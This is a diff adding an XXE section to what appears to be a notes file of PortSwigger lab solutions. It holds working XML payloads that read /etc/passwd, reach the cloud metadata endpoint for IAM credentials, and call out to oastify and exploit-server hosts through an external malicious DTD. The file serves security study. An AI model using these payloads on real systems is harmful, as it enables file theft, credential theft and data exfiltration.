@@ -389,3 +389,32 @@ location='https://exploit-0a6c004404690be78097022101e1007c.exploit-server.net/lo
 </script>
 ```
 {% endraw %}
+## XML external entity (XXE) injection
+### Notes
+### Labs
+{% raw %}
+```xml
+<!-- Exploiting XXE using external entities to retrieve files -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+<!-- Exploiting XXE to perform SSRF attacks -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+<!-- Blind XXE with out-of-band interaction -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://y986ss8wf27dv9r0fl3pa9qhl8rzfq3f.oastify.com"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+<!-- Blind XXE with out-of-band interaction via XML parameter entities -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://f2iqljkbv4pj487y4qpfge16cxio6fu4.oastify.com"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<!-- Exploiting blind XXE to exfiltrate data using a malicious external DTD -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a63002903b89a6c8297743201af004b.exploit-server.net/malicious.dtd"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+{% endraw %}
+- malicious.dtd can be found [here](/assets/solutions/portswigger/malicious.dtd)
+
